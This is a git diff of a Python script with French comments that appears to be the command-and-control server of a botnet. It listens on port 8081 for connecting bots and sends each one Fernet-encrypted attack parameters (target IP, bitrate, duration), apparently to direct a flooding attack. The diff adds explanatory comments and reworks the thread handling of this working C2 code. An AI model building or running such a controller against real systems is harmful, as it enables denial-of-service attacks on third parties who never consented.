@@ -33,11 +33,11 @@ with open("secret.key", "rb") as key_file:
     key=key_file.read()
 fernet = Fernet(key)
 
-#création d'une socket
+#Création d'une socket
 server_socket=socket.socket()
 
 
-
+#Recherche de l'adresse IP parmi les interfaces réseaux
 for ifaceName in interfaces():
     addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
     for addresse in addresses:
@@ -50,30 +50,30 @@ port=8081
 
 ThreadCount=0
 
+#Ouverture du socket
 server_socket.bind((host, port))
-
 server_socket.listen()
 
+#Function éxécutée quand un bot se connecte au serveur
 def multi_threaded_client(connection):
+    #Envoi des paramètres de l'attaque
     data=args.ip_address+" " +str(args.bitrate)+" "+str(args.time)
     data=bytes(data, 'utf-8')
     encrypted_data=fernet.encrypt(data)
-
     connection.send(encrypted_data)
     
-    while True:
-        """
-        data=connection.recv(2048)
-        response='Server message: ' + data.decode('utf-8')
-        if not data:
-            break
-        connection.sendall(str.encode(response))"""
-    connection.close()
+    connection.recv(1024)
+    global ThreadCount
+    ThreadCount -= 1
+    print('[-] Thread Number: ' + str(ThreadCount))
+    
 
+#Attente de connection des bots
 while True:
     Client, address = server_socket.accept()
     print('[+] Connected to: ' + address[0] + ':' + str(address[1]))
     start_new_thread(multi_threaded_client, (Client, ))
     ThreadCount += 1
     print('[+] Thread Number: ' + str(ThreadCount))
+    
 server_socket.close()
